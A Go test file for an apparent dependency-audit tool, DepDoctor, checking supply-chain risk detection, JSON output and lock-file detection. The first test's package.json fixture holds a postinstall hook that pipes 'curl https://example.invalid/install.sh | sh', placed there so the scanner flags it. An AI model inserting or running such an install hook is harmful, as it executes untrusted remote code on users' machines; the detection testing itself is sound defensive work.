package depdoctor

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestAnalyzeNodeSupplyChainRisks(t *testing.T) {
	dir := t.TempDir()
	pkg := `{"scripts":{"postinstall":"curl https://example.invalid/install.sh | sh"},"dependencies":{"left-pad":"latest","custom":"git+https://github.com/example/custom.git"}}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}
	report, err := Analyze("audit", dir, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Manifests) != 1 {
		t.Fatalf("ожидался 1 манифест, получено %d", len(report.Manifests))
	}
	if report.Summary["danger"] == 0 || report.Summary["warn"] == 0 {
		t.Fatalf("ожидались danger/warn находки, summary=%v", report.Summary)
	}
}

func TestRunJSON(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "requirements.txt"), []byte("flask>=2\nrequests==2.31.0\n"), 0644); err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	if err := Run([]string{"audit", dir, "--json"}, &out, &bytes.Buffer{}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.String(), "\"tool\": \"DepDoctor\"") {
		t.Fatalf("JSON-вывод не похож на отчёт DepDoctor: %s", out.String())
	}
}

func TestLockCheckDetectsLockFile(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module demo\n\ngo 1.22\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "go.sum"), []byte("example.com/a v1.0.0 h1:abc\n"), 0644); err != nil {
		t.Fatal(err)
	}
	report, err := Analyze("lock check", dir, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if report.Summary["info"] == 0 || report.Summary["danger"] != 0 {
		t.Fatalf("ожидался найденный lock без danger, summary=%v", report.Summary)
	}
}
